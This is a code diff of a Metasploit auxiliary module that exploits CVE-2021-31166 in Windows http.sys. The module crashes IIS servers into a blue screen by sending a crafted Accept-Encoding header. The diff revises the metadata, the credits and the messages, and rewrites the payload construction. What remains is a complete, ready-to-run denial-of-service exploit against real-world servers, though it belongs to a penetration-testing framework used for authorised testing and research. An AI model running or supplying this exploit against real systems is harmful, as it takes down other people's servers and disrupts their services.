@@ -1,15 +1,8 @@
-# frozen_string_literal: true
-
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-###
-#
-# This module performs a DOS attack using a simple HTTP request.
-#
-###
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Dos
@@ -18,18 +11,30 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'CVE-2021-31166: HTTP Protocol Stack Remote Code Execution' +
-          ' Vulnerability - Windows IIS DOS BlueScreen',
-        'Description' => 'This module can be used to perform a DOS attack on' +
-          ' IIS server. This module exploit CVE-2021-31166 and causes a Blue' +
-          ' Screen with only one payload.',
+        'Name' => 'Windows IIS HTTP Protocol Stack DOS',
+        'Description' => %q{
+          This module exploits CVE-2021-31166, a UAF bug in http.sys
+          that was patched by Microsoft in May 2021, to cause a BSOD and
+          crash the target IIS server. Successful exploitation will result
+          in the target BSOD'ing and the target server rebooting.
+        },
         'License' => MSF_LICENSE,
-        'Author' => ['Maurice LAMBERT <mauricelambert434@gmail.com>'],
+        'Author' => [
+          'Max',                                             # Aka @_mxms. Vulnerability discovery
+          'Stefan Blair',                                    # Aka @fzzyhd1. Vulnerability discovery
+          'Axel Souchet',                                    # Aka @0vercl0k. PoC exploit
+          'Maurice LAMBERT <mauricelambert434[at]gmail.com>' # msf module
+        ],
         'Platform' => 'win',
         'References' => [
           ['CVE', '2021-31166'],
           ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2021-31166'],
-          ['URL', 'https://github.com/mauricelambert/CVE-2021-31166']
+          ['URL', 'https://github.com/mauricelambert/CVE-2021-31166'],
+          ['URL', 'https://twitter.com/metr0/status/1392631376592076805'],
+          [
+            'URL', 
+            'https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31166'
+          ]
         ],
         'DisclosureDate' => '2021-05-11',
         'Notes' => {
@@ -49,10 +54,9 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  ##
   # This module performs a DOS attack using a simple HTTP request.
   def run
-    vprint_status('Trying first connection...')
+    print_status('Connecting to target to make sure its alive...')
 
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, ''),
@@ -62,31 +66,34 @@ class MetasploitModule < Msf::Auxiliary
     if res.nil?
       fail_with(
         Failure::Unreachable,
-        "#{peer} - Could not connect to web service - no response"
+        "#{peer} - Could not connect to the target IIS server - no response"
       )
     end
 
-    vprint_good('First connection OK. Sending payload...')
+    print_good('Successfully connected to target. Sending payload...')
 
-    payload = "#{rand(1..7).times.map do
-      (0...(rand(2..5))).map do
-        ('a'..'z').to_a[rand(26)]
-      end.join
-    end.join(', ')}, ,"
+    payload = (
+      "#{Rex::Text.rand_text_alpha(5)}, #{Rex::Text.rand_text_alpha(3)}, ,"
+    )
 
     payload = {
       'Accept-Encoding' => payload
     }
 
-    res = send_request_cgi({
-                             'uri' => normalize_uri(target_uri.path, ''),
-                             'timeout' => 1,
-                             # short timeout -> the server should not respond
-                             'method' => 'GET',
-                             'headers' => payload
-                           })
-
-    vprint_good('Payload is sent. Check that the server is down...')
+    begin
+        send_request_cgi({
+           'uri' => normalize_uri(target_uri.path, ''),
+           'timeout' => 1, # short timeout -> the server should not respond
+           'method' => 'GET',
+           'headers' => payload
+        })
+    rescue Rex::ConnectionError, Errno::ECONNRESET => e
+    ensure
+        print_good(
+          'Payload was sent to the target server.'\
+          ' Checking that the server is down...'
+        )
+    end
 
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, ''),
@@ -96,7 +103,9 @@ class MetasploitModule < Msf::Auxiliary
     if res.nil?
       print_good('Target is down.')
     else
-      print_error('Target is not vulnerable and up.')
+      print_error(
+        'Target appears to still be alive. It may have not received the packet due to network filtering, or it may not be vulnerable.'
+      )
     end
   end
 end
